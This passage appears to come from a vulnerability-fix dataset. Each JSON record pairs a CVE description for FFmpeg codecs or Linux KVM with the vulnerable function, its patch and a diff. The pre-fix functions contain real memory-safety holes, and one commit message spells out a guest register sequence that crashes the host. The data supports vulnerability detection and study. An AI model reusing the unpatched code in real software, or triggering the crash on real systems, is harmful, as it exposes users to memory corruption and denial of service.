        "git_url": "http://git.videolan.org/?p=ffmpeg.git;a=commit;h=be818df547c3b0ae4fadb50fd210139a8636706a",
        "commit_title": "",
        "commit_text": "wavpack: fix out of array access  ",
        "func_before": "static int wavpack_decode_frame(AVCodecContext *avctx, void *data,\n                                int *got_frame_ptr, AVPacket *avpkt)\n{\n    WavpackContext *s  = avctx->priv_data;\n    const uint8_t *buf = avpkt->data;\n    int buf_size       = avpkt->size;\n    int frame_size, ret, frame_flags;\n    int samplecount = 0;\n\n    s->block     = 0;\n    s->ch_offset = 0;\n\n    /* determine number of samples */\n    if (s->mkv_mode) {\n        s->samples  = AV_RL32(buf); buf += 4;\n        frame_flags = AV_RL32(buf);\n    } else {\n        if (s->multichannel) {\n            s->samples  = AV_RL32(buf + 4);\n            frame_flags = AV_RL32(buf + 8);\n        } else {\n            s->samples  = AV_RL32(buf);\n            frame_flags = AV_RL32(buf + 4);\n        }\n    }\n    if (s->samples <= 0 || s->samples > WV_MAX_SAMPLES) {\n        av_log(avctx, AV_LOG_ERROR, \"Invalid number of samples: %d\\n\",\n               s->samples);\n        return AVERROR(EINVAL);\n    }\n\n    if (frame_flags & 0x80) {\n        avctx->sample_fmt = AV_SAMPLE_FMT_FLT;\n    } else if ((frame_flags & 0x03) <= 1) {\n        avctx->sample_fmt = AV_SAMPLE_FMT_S16;\n    } else {\n        avctx->sample_fmt = AV_SAMPLE_FMT_S32;\n        avctx->bits_per_raw_sample = ((frame_flags & 0x03) + 1) << 3;\n    }\n\n    /* get output buffer */\n    s->frame.nb_samples = s->samples;\n    if ((ret = avctx->get_buffer(avctx, &s->frame)) < 0) {\n        av_log(avctx, AV_LOG_ERROR, \"get_buffer() failed\\n\");\n        return ret;\n    }\n\n    while (buf_size > 0) {\n        if (!s->multichannel) {\n            frame_size = buf_size;\n        } else {\n            if (!s->mkv_mode) {\n                frame_size = AV_RL32(buf) - 12; buf += 4; buf_size -= 4;\n            } else {\n                if (buf_size < 12) //MKV files can have zero flags after last block\n                    break;\n                frame_size = AV_RL32(buf + 8) + 12;\n            }\n        }\n        if (frame_size < 0 || frame_size > buf_size) {\n            av_log(avctx, AV_LOG_ERROR, \"Block %d has invalid size (size %d \"\n                   \"vs. %d bytes left)\\n\", s->block, frame_size, buf_size);\n            wavpack_decode_flush(avctx);\n            return AVERROR_INVALIDDATA;\n        }\n        if ((samplecount = wavpack_decode_block(avctx, s->block,\n                                                s->frame.data[0], got_frame_ptr,\n                                                buf, frame_size)) < 0) {\n            wavpack_decode_flush(avctx);\n            return AVERROR_INVALIDDATA;\n        }\n        s->block++;\n        buf += frame_size; buf_size -= frame_size;\n    }\n\n    if (*got_frame_ptr)\n        *(AVFrame *)data = s->frame;\n\n    return avpkt->size;\n}",
        "func": "static int wavpack_decode_frame(AVCodecContext *avctx, void *data,\n                                int *got_frame_ptr, AVPacket *avpkt)\n{\n    WavpackContext *s  = avctx->priv_data;\n    const uint8_t *buf = avpkt->data;\n    int buf_size       = avpkt->size;\n    int frame_size, ret, frame_flags;\n    int samplecount = 0;\n\n    s->block     = 0;\n    s->ch_offset = 0;\n\n    /* determine number of samples */\n    if (s->mkv_mode) {\n        s->samples  = AV_RL32(buf); buf += 4;\n        frame_flags = AV_RL32(buf);\n    } else {\n        if (s->multichannel) {\n            s->samples  = AV_RL32(buf + 4);\n            frame_flags = AV_RL32(buf + 8);\n        } else {\n            s->samples  = AV_RL32(buf);\n            frame_flags = AV_RL32(buf + 4);\n        }\n    }\n    if (s->samples <= 0 || s->samples > WV_MAX_SAMPLES) {\n        av_log(avctx, AV_LOG_ERROR, \"Invalid number of samples: %d\\n\",\n               s->samples);\n        return AVERROR(EINVAL);\n    }\n\n    if (frame_flags & 0x80) {\n        avctx->sample_fmt = AV_SAMPLE_FMT_FLT;\n    } else if ((frame_flags & 0x03) <= 1) {\n        avctx->sample_fmt = AV_SAMPLE_FMT_S16;\n    } else {\n        avctx->sample_fmt = AV_SAMPLE_FMT_S32;\n        avctx->bits_per_raw_sample = ((frame_flags & 0x03) + 1) << 3;\n    }\n\n    /* get output buffer */\n    s->frame.nb_samples = s->samples + 1;\n    if ((ret = avctx->get_buffer(avctx, &s->frame)) < 0) {\n        av_log(avctx, AV_LOG_ERROR, \"get_buffer() failed\\n\");\n        return ret;\n    }\n    s->frame.nb_samples = s->samples;\n\n    while (buf_size > 0) {\n        if (!s->multichannel) {\n            frame_size = buf_size;\n        } else {\n            if (!s->mkv_mode) {\n                frame_size = AV_RL32(buf) - 12; buf += 4; buf_size -= 4;\n            } else {\n                if (buf_size < 12) //MKV files can have zero flags after last block\n                    break;\n                frame_size = AV_RL32(buf + 8) + 12;\n            }\n        }\n        if (frame_size < 0 || frame_size > buf_size) {\n            av_log(avctx, AV_LOG_ERROR, \"Block %d has invalid size (size %d \"\n                   \"vs. %d bytes left)\\n\", s->block, frame_size, buf_size);\n            wavpack_decode_flush(avctx);\n            return AVERROR_INVALIDDATA;\n        }\n        if ((samplecount = wavpack_decode_block(avctx, s->block,\n                                                s->frame.data[0], got_frame_ptr,\n                                                buf, frame_size)) < 0) {\n            wavpack_decode_flush(avctx);\n            return AVERROR_INVALIDDATA;\n        }\n        s->block++;\n        buf += frame_size; buf_size -= frame_size;\n    }\n\n    if (*got_frame_ptr)\n        *(AVFrame *)data = s->frame;\n\n    return avpkt->size;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -39,11 +39,12 @@\n     }\n \n     /* get output buffer */\n-    s->frame.nb_samples = s->samples;\n+    s->frame.nb_samples = s->samples + 1;\n     if ((ret = avctx->get_buffer(avctx, &s->frame)) < 0) {\n         av_log(avctx, AV_LOG_ERROR, \"get_buffer() failed\\n\");\n         return ret;\n     }\n+    s->frame.nb_samples = s->samples;\n \n     while (buf_size > 0) {\n         if (!s->multichannel) {",
        "diff_line_info": {
            "deleted_lines": [
                "    s->frame.nb_samples = s->samples;"
            ],
            "added_lines": [
                "    s->frame.nb_samples = s->samples + 1;",
                "    s->frame.nb_samples = s->samples;"
            ]
        }
    },
    {
        "cve_id": "CVE-2013-0855",
        "func_name": "ffmpeg/allocate_buffers",
        "description": "Integer overflow in the alac_decode_close function in libavcodec/alac.c in FFmpeg before 1.1 allows remote attackers to have an unspecified impact via a large number of samples per frame in Apple Lossless Audio Codec (ALAC) data, which triggers an out-of-bounds array access.",
        "git_url": "http://git.videolan.org/?p=ffmpeg.git;a=commit;h=3920d1387834e2bc334aff9f518f4beb24e470bd",
        "commit_title": "",
        "commit_text": "alac: fix integer overflow leading to subsequent out of array accesses.  ",
        "func_before": "static int allocate_buffers(ALACContext *alac)\n{\n    int ch;\n    int buf_size = alac->max_samples_per_frame * sizeof(int32_t);\n\n    for (ch = 0; ch < FFMIN(alac->channels, 2); ch++) {\n        FF_ALLOC_OR_GOTO(alac->avctx, alac->predict_error_buffer[ch],\n                         buf_size, buf_alloc_fail);\n\n        alac->direct_output = alac->sample_size > 16 && av_sample_fmt_is_planar(alac->avctx->sample_fmt);\n        if (!alac->direct_output) {\n            FF_ALLOC_OR_GOTO(alac->avctx, alac->output_samples_buffer[ch],\n                             buf_size, buf_alloc_fail);\n        }\n\n        FF_ALLOC_OR_GOTO(alac->avctx, alac->extra_bits_buffer[ch],\n                         buf_size, buf_alloc_fail);\n    }\n    return 0;\nbuf_alloc_fail:\n    alac_decode_close(alac->avctx);\n    return AVERROR(ENOMEM);\n}",
        "func": "static int allocate_buffers(ALACContext *alac)\n{\n    int ch;\n    int buf_size;\n\n    if (alac->max_samples_per_frame > INT_MAX / sizeof(int32_t))\n        goto buf_alloc_fail;\n    buf_size = alac->max_samples_per_frame * sizeof(int32_t);\n\n    for (ch = 0; ch < FFMIN(alac->channels, 2); ch++) {\n        FF_ALLOC_OR_GOTO(alac->avctx, alac->predict_error_buffer[ch],\n                         buf_size, buf_alloc_fail);\n\n        alac->direct_output = alac->sample_size > 16 && av_sample_fmt_is_planar(alac->avctx->sample_fmt);\n        if (!alac->direct_output) {\n            FF_ALLOC_OR_GOTO(alac->avctx, alac->output_samples_buffer[ch],\n                             buf_size, buf_alloc_fail);\n        }\n\n        FF_ALLOC_OR_GOTO(alac->avctx, alac->extra_bits_buffer[ch],\n                         buf_size, buf_alloc_fail);\n    }\n    return 0;\nbuf_alloc_fail:\n    alac_decode_close(alac->avctx);\n    return AVERROR(ENOMEM);\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -1,7 +1,11 @@\n static int allocate_buffers(ALACContext *alac)\n {\n     int ch;\n-    int buf_size = alac->max_samples_per_frame * sizeof(int32_t);\n+    int buf_size;\n+\n+    if (alac->max_samples_per_frame > INT_MAX / sizeof(int32_t))\n+        goto buf_alloc_fail;\n+    buf_size = alac->max_samples_per_frame * sizeof(int32_t);\n \n     for (ch = 0; ch < FFMIN(alac->channels, 2); ch++) {\n         FF_ALLOC_OR_GOTO(alac->avctx, alac->predict_error_buffer[ch],",
        "diff_line_info": {
            "deleted_lines": [
                "    int buf_size = alac->max_samples_per_frame * sizeof(int32_t);"
            ],
            "added_lines": [
                "    int buf_size;",
                "",
                "    if (alac->max_samples_per_frame > INT_MAX / sizeof(int32_t))",
                "        goto buf_alloc_fail;",
                "    buf_size = alac->max_samples_per_frame * sizeof(int32_t);"
            ]
        }
    },
    {
        "cve_id": "CVE-2013-0859",
        "func_name": "ffmpeg/add_shorts_metadata",
        "description": "The add_doubles_metadata function in libavcodec/tiff.c in FFmpeg before 1.1 allows remote attackers to have an unspecified impact via a negative or zero count value in a TIFF image, which triggers an out-of-bounds array access.",
        "git_url": "http://git.videolan.org/?p=ffmpeg.git;a=commit;h=6d1c5ea04af3e345232aa70c944de961061dab2d",
        "commit_title": "",
        "commit_text": "tiffdec: check count in metadata reading.  Fixes out of array access  ",
        "func_before": "static int add_shorts_metadata(int count, const char *name,\n                               const char *sep, TiffContext *s)\n{\n    char *ap;\n    int i;\n    int16_t *sp;\n\n    if (count >= INT_MAX / sizeof(int16_t))\n        return AVERROR_INVALIDDATA;\n    if (bytestream2_get_bytes_left(&s->gb) < count * sizeof(int16_t))\n        return AVERROR_INVALIDDATA;\n\n    sp = av_malloc(count * sizeof(int16_t));\n    if (!sp)\n        return AVERROR(ENOMEM);\n\n    for (i = 0; i < count; i++)\n        sp[i] = tget_short(&s->gb, s->le);\n    ap = shorts2str(sp, count, sep);\n    av_freep(&sp);\n    if (!ap)\n        return AVERROR(ENOMEM);\n    av_dict_set(&s->picture.metadata, name, ap, AV_DICT_DONT_STRDUP_VAL);\n    return 0;\n}",
        "func": "static int add_shorts_metadata(int count, const char *name,\n                               const char *sep, TiffContext *s)\n{\n    char *ap;\n    int i;\n    int16_t *sp;\n\n    if (count >= INT_MAX / sizeof(int16_t) || count <= 0)\n        return AVERROR_INVALIDDATA;\n    if (bytestream2_get_bytes_left(&s->gb) < count * sizeof(int16_t))\n        return AVERROR_INVALIDDATA;\n\n    sp = av_malloc(count * sizeof(int16_t));\n    if (!sp)\n        return AVERROR(ENOMEM);\n\n    for (i = 0; i < count; i++)\n        sp[i] = tget_short(&s->gb, s->le);\n    ap = shorts2str(sp, count, sep);\n    av_freep(&sp);\n    if (!ap)\n        return AVERROR(ENOMEM);\n    av_dict_set(&s->picture.metadata, name, ap, AV_DICT_DONT_STRDUP_VAL);\n    return 0;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -5,7 +5,7 @@\n     int i;\n     int16_t *sp;\n \n-    if (count >= INT_MAX / sizeof(int16_t))\n+    if (count >= INT_MAX / sizeof(int16_t) || count <= 0)\n         return AVERROR_INVALIDDATA;\n     if (bytestream2_get_bytes_left(&s->gb) < count * sizeof(int16_t))\n         return AVERROR_INVALIDDATA;",
        "diff_line_info": {
            "deleted_lines": [
                "    if (count >= INT_MAX / sizeof(int16_t))"
            ],
            "added_lines": [
                "    if (count >= INT_MAX / sizeof(int16_t) || count <= 0)"
            ]
        }
    },
    {
        "cve_id": "CVE-2013-0859",
        "func_name": "ffmpeg/add_doubles_metadata",
        "description": "The add_doubles_metadata function in libavcodec/tiff.c in FFmpeg before 1.1 allows remote attackers to have an unspecified impact via a negative or zero count value in a TIFF image, which triggers an out-of-bounds array access.",
        "git_url": "http://git.videolan.org/?p=ffmpeg.git;a=commit;h=6d1c5ea04af3e345232aa70c944de961061dab2d",
        "commit_title": "",
        "commit_text": "tiffdec: check count in metadata reading.  Fixes out of array access  ",
        "func_before": "static int add_doubles_metadata(int count,\n                                const char *name, const char *sep,\n                                TiffContext *s)\n{\n    char *ap;\n    int i;\n    double *dp;\n\n    if (count >= INT_MAX / sizeof(int64_t))\n        return AVERROR_INVALIDDATA;\n    if (bytestream2_get_bytes_left(&s->gb) < count * sizeof(int64_t))\n        return AVERROR_INVALIDDATA;\n\n    dp = av_malloc(count * sizeof(double));\n    if (!dp)\n        return AVERROR(ENOMEM);\n\n    for (i = 0; i < count; i++)\n        dp[i] = tget_double(&s->gb, s->le);\n    ap = doubles2str(dp, count, sep);\n    av_freep(&dp);\n    if (!ap)\n        return AVERROR(ENOMEM);\n    av_dict_set(&s->picture.metadata, name, ap, AV_DICT_DONT_STRDUP_VAL);\n    return 0;\n}",
        "func": "static int add_doubles_metadata(int count,\n                                const char *name, const char *sep,\n                                TiffContext *s)\n{\n    char *ap;\n    int i;\n    double *dp;\n\n    if (count >= INT_MAX / sizeof(int64_t) || count <= 0)\n        return AVERROR_INVALIDDATA;\n    if (bytestream2_get_bytes_left(&s->gb) < count * sizeof(int64_t))\n        return AVERROR_INVALIDDATA;\n\n    dp = av_malloc(count * sizeof(double));\n    if (!dp)\n        return AVERROR(ENOMEM);\n\n    for (i = 0; i < count; i++)\n        dp[i] = tget_double(&s->gb, s->le);\n    ap = doubles2str(dp, count, sep);\n    av_freep(&dp);\n    if (!ap)\n        return AVERROR(ENOMEM);\n    av_dict_set(&s->picture.metadata, name, ap, AV_DICT_DONT_STRDUP_VAL);\n    return 0;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -6,7 +6,7 @@\n     int i;\n     double *dp;\n \n-    if (count >= INT_MAX / sizeof(int64_t))\n+    if (count >= INT_MAX / sizeof(int64_t) || count <= 0)\n         return AVERROR_INVALIDDATA;\n     if (bytestream2_get_bytes_left(&s->gb) < count * sizeof(int64_t))\n         return AVERROR_INVALIDDATA;",
        "diff_line_info": {
            "deleted_lines": [
                "    if (count >= INT_MAX / sizeof(int64_t))"
            ],
            "added_lines": [
                "    if (count >= INT_MAX / sizeof(int64_t) || count <= 0)"
            ]
        }
    },
    {
        "cve_id": "CVE-2013-7010",
        "func_name": "ffmpeg/add_bytes_c",
        "description": "Multiple integer signedness errors in libavcodec/dsputil.c in FFmpeg before 2.1 allow remote attackers to cause a denial of service (out-of-bounds array access) or possibly have unspecified other impact via crafted data.",
        "git_url": "https://github.com/FFmpeg/FFmpeg/commit/454a11a1c9c686c78aa97954306fb63453299760",
        "commit_title": "avcodec/dsputil: fix signedness in sizeof() comparissions",
        "commit_text": "",
        "func_before": "static void add_bytes_c(uint8_t *dst, uint8_t *src, int w){\n    long i;\n    for(i=0; i<=w-sizeof(long); i+=sizeof(long)){\n        long a = *(long*)(src+i);\n        long b = *(long*)(dst+i);\n        *(long*)(dst+i) = ((a&pb_7f) + (b&pb_7f)) ^ ((a^b)&pb_80);\n    }\n    for(; i<w; i++)\n        dst[i+0] += src[i+0];\n}",
        "func": "static void add_bytes_c(uint8_t *dst, uint8_t *src, int w){\n    long i;\n    for(i=0; i<=w-(int)sizeof(long); i+=sizeof(long)){\n        long a = *(long*)(src+i);\n        long b = *(long*)(dst+i);\n        *(long*)(dst+i) = ((a&pb_7f) + (b&pb_7f)) ^ ((a^b)&pb_80);\n    }\n    for(; i<w; i++)\n        dst[i+0] += src[i+0];\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -1,6 +1,6 @@\n static void add_bytes_c(uint8_t *dst, uint8_t *src, int w){\n     long i;\n-    for(i=0; i<=w-sizeof(long); i+=sizeof(long)){\n+    for(i=0; i<=w-(int)sizeof(long); i+=sizeof(long)){\n         long a = *(long*)(src+i);\n         long b = *(long*)(dst+i);\n         *(long*)(dst+i) = ((a&pb_7f) + (b&pb_7f)) ^ ((a^b)&pb_80);",
        "diff_line_info": {
            "deleted_lines": [
                "    for(i=0; i<=w-sizeof(long); i+=sizeof(long)){"
            ],
            "added_lines": [
                "    for(i=0; i<=w-(int)sizeof(long); i+=sizeof(long)){"
            ]
        }
    },
    {
        "cve_id": "CVE-2013-7010",
        "func_name": "ffmpeg/diff_bytes_c",
        "description": "Multiple integer signedness errors in libavcodec/dsputil.c in FFmpeg before 2.1 allow remote attackers to cause a denial of service (out-of-bounds array access) or possibly have unspecified other impact via crafted data.",
        "git_url": "https://github.com/FFmpeg/FFmpeg/commit/454a11a1c9c686c78aa97954306fb63453299760",
        "commit_title": "avcodec/dsputil: fix signedness in sizeof() comparissions",
        "commit_text": "",
        "func_before": "static void diff_bytes_c(uint8_t *dst, const uint8_t *src1, const uint8_t *src2, int w){\n    long i;\n#if !HAVE_FAST_UNALIGNED\n    if((long)src2 & (sizeof(long)-1)){\n        for(i=0; i+7<w; i+=8){\n            dst[i+0] = src1[i+0]-src2[i+0];\n            dst[i+1] = src1[i+1]-src2[i+1];\n            dst[i+2] = src1[i+2]-src2[i+2];\n            dst[i+3] = src1[i+3]-src2[i+3];\n            dst[i+4] = src1[i+4]-src2[i+4];\n            dst[i+5] = src1[i+5]-src2[i+5];\n            dst[i+6] = src1[i+6]-src2[i+6];\n            dst[i+7] = src1[i+7]-src2[i+7];\n        }\n    }else\n#endif\n    for(i=0; i<=w-sizeof(long); i+=sizeof(long)){\n        long a = *(long*)(src1+i);\n        long b = *(long*)(src2+i);\n        *(long*)(dst+i) = ((a|pb_80) - (b&pb_7f)) ^ ((a^b^pb_80)&pb_80);\n    }\n    for(; i<w; i++)\n        dst[i+0] = src1[i+0]-src2[i+0];\n}",
        "func": "static void diff_bytes_c(uint8_t *dst, const uint8_t *src1, const uint8_t *src2, int w){\n    long i;\n#if !HAVE_FAST_UNALIGNED\n    if((long)src2 & (sizeof(long)-1)){\n        for(i=0; i+7<w; i+=8){\n            dst[i+0] = src1[i+0]-src2[i+0];\n            dst[i+1] = src1[i+1]-src2[i+1];\n            dst[i+2] = src1[i+2]-src2[i+2];\n            dst[i+3] = src1[i+3]-src2[i+3];\n            dst[i+4] = src1[i+4]-src2[i+4];\n            dst[i+5] = src1[i+5]-src2[i+5];\n            dst[i+6] = src1[i+6]-src2[i+6];\n            dst[i+7] = src1[i+7]-src2[i+7];\n        }\n    }else\n#endif\n    for(i=0; i<=w-(int)sizeof(long); i+=sizeof(long)){\n        long a = *(long*)(src1+i);\n        long b = *(long*)(src2+i);\n        *(long*)(dst+i) = ((a|pb_80) - (b&pb_7f)) ^ ((a^b^pb_80)&pb_80);\n    }\n    for(; i<w; i++)\n        dst[i+0] = src1[i+0]-src2[i+0];\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -14,7 +14,7 @@\n         }\n     }else\n #endif\n-    for(i=0; i<=w-sizeof(long); i+=sizeof(long)){\n+    for(i=0; i<=w-(int)sizeof(long); i+=sizeof(long)){\n         long a = *(long*)(src1+i);\n         long b = *(long*)(src2+i);\n         *(long*)(dst+i) = ((a|pb_80) - (b&pb_7f)) ^ ((a^b^pb_80)&pb_80);",
        "diff_line_info": {
            "deleted_lines": [
                "    for(i=0; i<=w-sizeof(long); i+=sizeof(long)){"
            ],
            "added_lines": [
                "    for(i=0; i<=w-(int)sizeof(long); i+=sizeof(long)){"
            ]
        }
    },
    {
        "cve_id": "CVE-2013-7013",
        "func_name": "ffmpeg/g2m_init_buffers",
        "description": "The g2m_init_buffers function in libavcodec/g2meet.c in FFmpeg before 2.1 uses an incorrect ordering of arithmetic operations, which allows remote attackers to cause a denial of service (out-of-bounds array access) or possibly have unspecified other impact via crafted Go2Webinar data.",
        "git_url": "https://github.com/FFmpeg/FFmpeg/commit/821a5938d100458f4d09d634041b05c860554ce0",
        "commit_title": "avcodec/g2meet: Fix order of align and pixel size multiplication.",
        "commit_text": " Fixes out of array accesses Fixes Ticket2922 ",
        "func_before": "static int g2m_init_buffers(G2MContext *c)\n{\n    int aligned_height;\n\n    if (!c->framebuf || c->old_width < c->width || c->old_height < c->height) {\n        c->framebuf_stride = FFALIGN(c->width * 3, 16);\n        aligned_height     = FFALIGN(c->height,    16);\n        av_free(c->framebuf);\n        c->framebuf = av_mallocz(c->framebuf_stride * aligned_height);\n        if (!c->framebuf)\n            return AVERROR(ENOMEM);\n    }\n    if (!c->synth_tile || !c->jpeg_tile ||\n        c->old_tile_w < c->tile_width ||\n        c->old_tile_h < c->tile_height) {\n        c->tile_stride = FFALIGN(c->tile_width * 3, 16);\n        aligned_height = FFALIGN(c->tile_height,    16);\n        av_free(c->synth_tile);\n        av_free(c->jpeg_tile);\n        av_free(c->kempf_buf);\n        av_free(c->kempf_flags);\n        c->synth_tile  = av_mallocz(c->tile_stride      * aligned_height);\n        c->jpeg_tile   = av_mallocz(c->tile_stride      * aligned_height);\n        c->kempf_buf   = av_mallocz((c->tile_width + 1) * aligned_height\n                                    + FF_INPUT_BUFFER_PADDING_SIZE);\n        c->kempf_flags = av_mallocz( c->tile_width      * aligned_height);\n        if (!c->synth_tile || !c->jpeg_tile ||\n            !c->kempf_buf || !c->kempf_flags)\n            return AVERROR(ENOMEM);\n    }\n\n    return 0;\n}",
        "func": "static int g2m_init_buffers(G2MContext *c)\n{\n    int aligned_height;\n\n    if (!c->framebuf || c->old_width < c->width || c->old_height < c->height) {\n        c->framebuf_stride = FFALIGN(c->width * 3, 16);\n        aligned_height     = FFALIGN(c->height,    16);\n        av_free(c->framebuf);\n        c->framebuf = av_mallocz(c->framebuf_stride * aligned_height);\n        if (!c->framebuf)\n            return AVERROR(ENOMEM);\n    }\n    if (!c->synth_tile || !c->jpeg_tile ||\n        c->old_tile_w < c->tile_width ||\n        c->old_tile_h < c->tile_height) {\n        c->tile_stride = FFALIGN(c->tile_width, 16) * 3;\n        aligned_height = FFALIGN(c->tile_height,    16);\n        av_free(c->synth_tile);\n        av_free(c->jpeg_tile);\n        av_free(c->kempf_buf);\n        av_free(c->kempf_flags);\n        c->synth_tile  = av_mallocz(c->tile_stride      * aligned_height);\n        c->jpeg_tile   = av_mallocz(c->tile_stride      * aligned_height);\n        c->kempf_buf   = av_mallocz((c->tile_width + 1) * aligned_height\n                                    + FF_INPUT_BUFFER_PADDING_SIZE);\n        c->kempf_flags = av_mallocz( c->tile_width      * aligned_height);\n        if (!c->synth_tile || !c->jpeg_tile ||\n            !c->kempf_buf || !c->kempf_flags)\n            return AVERROR(ENOMEM);\n    }\n\n    return 0;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -13,7 +13,7 @@\n     if (!c->synth_tile || !c->jpeg_tile ||\n         c->old_tile_w < c->tile_width ||\n         c->old_tile_h < c->tile_height) {\n-        c->tile_stride = FFALIGN(c->tile_width * 3, 16);\n+        c->tile_stride = FFALIGN(c->tile_width, 16) * 3;\n         aligned_height = FFALIGN(c->tile_height,    16);\n         av_free(c->synth_tile);\n         av_free(c->jpeg_tile);",
        "diff_line_info": {
            "deleted_lines": [
                "        c->tile_stride = FFALIGN(c->tile_width * 3, 16);"
            ],
            "added_lines": [
                "        c->tile_stride = FFALIGN(c->tile_width, 16) * 3;"
            ]
        }
    },
    {
        "cve_id": "CVE-2013-7014",
        "func_name": "ffmpeg/add_bytes_l2_c",
        "description": "Integer signedness error in the add_bytes_l2_c function in libavcodec/pngdsp.c in FFmpeg before 2.1 allows remote attackers to cause a denial of service (out-of-bounds array access) or possibly have unspecified other impact via crafted PNG data.",
        "git_url": "https://github.com/FFmpeg/FFmpeg/commit/86736f59d6a527d8bc807d09b93f971c0fe0bb07",
        "commit_title": "avcodec/pngdsp: fix (un)signed type in end comparission",
        "commit_text": " Fixes out of array accesses Fixes Ticket2919  Found_by: ami_stuff",
        "func_before": "static void add_bytes_l2_c(uint8_t *dst, uint8_t *src1, uint8_t *src2, int w)\n{\n    long i;\n    for (i = 0; i <= w - sizeof(long); i += sizeof(long)) {\n        long a = *(long *)(src1 + i);\n        long b = *(long *)(src2 + i);\n        *(long *)(dst + i) = ((a & pb_7f) + (b & pb_7f)) ^ ((a ^ b) & pb_80);\n    }\n    for (; i < w; i++)\n        dst[i] = src1[i] + src2[i];\n}",
        "func": "static void add_bytes_l2_c(uint8_t *dst, uint8_t *src1, uint8_t *src2, int w)\n{\n    long i;\n    for (i = 0; i <= w - (int)sizeof(long); i += sizeof(long)) {\n        long a = *(long *)(src1 + i);\n        long b = *(long *)(src2 + i);\n        *(long *)(dst + i) = ((a & pb_7f) + (b & pb_7f)) ^ ((a ^ b) & pb_80);\n    }\n    for (; i < w; i++)\n        dst[i] = src1[i] + src2[i];\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -1,7 +1,7 @@\n static void add_bytes_l2_c(uint8_t *dst, uint8_t *src1, uint8_t *src2, int w)\n {\n     long i;\n-    for (i = 0; i <= w - sizeof(long); i += sizeof(long)) {\n+    for (i = 0; i <= w - (int)sizeof(long); i += sizeof(long)) {\n         long a = *(long *)(src1 + i);\n         long b = *(long *)(src2 + i);\n         *(long *)(dst + i) = ((a & pb_7f) + (b & pb_7f)) ^ ((a ^ b) & pb_80);",
        "diff_line_info": {
            "deleted_lines": [
                "    for (i = 0; i <= w - sizeof(long); i += sizeof(long)) {"
            ],
            "added_lines": [
                "    for (i = 0; i <= w - (int)sizeof(long); i += sizeof(long)) {"
            ]
        }
    },
    {
        "cve_id": "CVE-2013-6367",
        "func_name": "torvalds/linux/apic_get_tmcct",
        "description": "The apic_get_tmcct function in arch/x86/kvm/lapic.c in the KVM subsystem in the Linux kernel through 3.12.5 allows guest OS users to cause a denial of service (divide-by-zero error and host OS crash) via crafted modifications of the TMICT value.",
        "git_url": "https://github.com/torvalds/linux/commit/b963a22e6d1a266a67e9eecc88134713fd54775c",
        "commit_title": "KVM: x86: Fix potential divide by 0 in lapic (CVE-2013-6367)",
        "commit_text": " Under guest controllable circumstances apic_get_tmcct will execute a divide by zero and cause a crash.  If the guest cpuid support tsc deadline timers and performs the following sequence of requests the host will crash. - Set the mode to periodic - Set the TMICT to 0 - Set the mode bits to 11 (neither periodic, nor one shot, nor tsc deadline) - Set the TMICT to non-zero. Then the lapic_timer.period will be 0, but the TMICT will not be.  If the guest then reads from the TMCCT then the host will perform a divide by 0.  This patch ensures that if the lapic_timer.period is 0, then the division does not occur.  Cc: stable@vger.kernel.org",
        "func_before": "static u32 apic_get_tmcct(struct kvm_lapic *apic)\n{\n\tktime_t remaining;\n\ts64 ns;\n\tu32 tmcct;\n\n\tASSERT(apic != NULL);\n\n\t/* if initial count is 0, current count should also be 0 */\n\tif (kvm_apic_get_reg(apic, APIC_TMICT) == 0)\n\t\treturn 0;\n\n\tremaining = hrtimer_get_remaining(&apic->lapic_timer.timer);\n\tif (ktime_to_ns(remaining) < 0)\n\t\tremaining = ktime_set(0, 0);\n\n\tns = mod_64(ktime_to_ns(remaining), apic->lapic_timer.period);\n\ttmcct = div64_u64(ns,\n\t\t\t (APIC_BUS_CYCLE_NS * apic->divide_count));\n\n\treturn tmcct;\n}",
        "func": "static u32 apic_get_tmcct(struct kvm_lapic *apic)\n{\n\tktime_t remaining;\n\ts64 ns;\n\tu32 tmcct;\n\n\tASSERT(apic != NULL);\n\n\t/* if initial count is 0, current count should also be 0 */\n\tif (kvm_apic_get_reg(apic, APIC_TMICT) == 0 ||\n\t\tapic->lapic_timer.period == 0)\n\t\treturn 0;\n\n\tremaining = hrtimer_get_remaining(&apic->lapic_timer.timer);\n\tif (ktime_to_ns(remaining) < 0)\n\t\tremaining = ktime_set(0, 0);\n\n\tns = mod_64(ktime_to_ns(remaining), apic->lapic_timer.period);\n\ttmcct = div64_u64(ns,\n\t\t\t (APIC_BUS_CYCLE_NS * apic->divide_count));\n\n\treturn tmcct;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -7,7 +7,8 @@\n \tASSERT(apic != NULL);\n \n \t/* if initial count is 0, current count should also be 0 */\n-\tif (kvm_apic_get_reg(apic, APIC_TMICT) == 0)\n+\tif (kvm_apic_get_reg(apic, APIC_TMICT) == 0 ||\n+\t\tapic->lapic_timer.period == 0)\n \t\treturn 0;\n \n \tremaining = hrtimer_get_remaining(&apic->lapic_timer.timer);",
        "diff_line_info": {
            "deleted_lines": [
                "\tif (kvm_apic_get_reg(apic, APIC_TMICT) == 0)"
            ],
            "added_lines": [
                "\tif (kvm_apic_get_reg(apic, APIC_TMICT) == 0 ||",
                "\t\tapic->lapic_timer.period == 0)"
            ]
        }
    },
    {
        "cve_id": "CVE-2013-6376",
        "func_name": "torvalds/linux/recalculate_apic_map",
        "description": "The recalculate_apic_map function in arch/x86/kvm/lapic.c in the KVM subsystem in the Linux kernel through 3.12.5 allows guest OS users to cause a denial of service (host OS crash) via a crafted ICR write operation in x2apic mode.",
        "git_url": "https://github.com/torvalds/linux/commit/17d68b763f09a9ce824ae23eb62c9efc57b69271",
        "commit_title": "KVM: x86: fix guest-initiated crash with x2apic (CVE-2013-6376)",
        "commit_text": " A guest can cause a BUG_ON() leading to a host kernel crash. When the guest writes to the ICR to request an IPI, while in x2apic mode the following things happen, the destination is read from ICR2, which is a register that the guest can control.  kvm_irq_delivery_to_apic_fast uses the high 16 bits of ICR2 as the cluster id.  A BUG_ON is triggered, which is a protection against accessing map->logical_map with an out-of-bounds access and manages to avoid that anything really unsafe occurs.  The logic in the code is correct from real HW point of view. The problem is that KVM supports only one cluster with ID 0 in clustered mode, but the code that has the bug does not take this into account.  Cc: stable@vger.kernel.org",
